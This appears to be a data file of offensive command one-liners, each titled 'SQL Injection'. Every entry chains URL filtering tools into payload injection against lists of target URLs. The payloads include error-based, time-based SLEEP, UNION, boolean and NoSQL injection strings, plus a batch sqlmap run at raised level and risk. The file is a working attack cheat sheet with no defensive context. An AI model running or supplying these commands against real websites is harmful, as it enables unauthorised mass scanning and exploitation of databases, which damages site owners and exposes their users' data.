title: 🗄️ SQL Injection
command_pattern: cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2

title: 🗄️ SQL Injection
command_pattern: cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql|oracle" | anew sqli_errors.txt

title: 🗄️ SQL Injection
command_pattern: cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10 | anew time_based.txt

title: 🗄️ SQL Injection
command_pattern: cat urls.txt | gf sqli | qsreplace "1 UNION SELECT NULL,NULL,NULL-- -" | httpx -silent -mc 200

title: 🗄️ SQL Injection
command_pattern: cat urls.txt | gf sqli | qsreplace "1' AND '1'='1" | httpx -silent -mc 200 | anew boolean_sqli.txt

title: 🗄️ SQL Injection
command_pattern:
cat urls.txt | qsreplace '{"$gt":""}' | httpx -silent -mc 200 | anew nosqli.txt
cat urls.txt | qsreplace "admin'||'1'=='1" | httpx -silent | anew nosqli.txt
